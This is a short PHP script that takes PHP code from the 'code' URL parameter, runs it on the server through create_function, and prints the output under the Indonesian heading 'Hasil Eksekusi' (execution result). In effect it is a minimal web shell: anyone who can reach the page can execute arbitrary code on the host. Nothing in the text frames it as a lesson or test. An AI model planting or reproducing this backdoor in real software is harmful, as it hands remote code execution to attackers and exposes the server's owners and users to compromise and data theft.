<?php
if (isset($_GET['code'])) {
    $code = $_GET['code'];

    $function = create_function('', $code);

    ob_start();
    $function();
    $output = ob_get_clean();

    echo "Hasil Eksekusi:<br>";
    echo "<pre>" . htmlspecialchars($output) . "</pre>";
}
?>

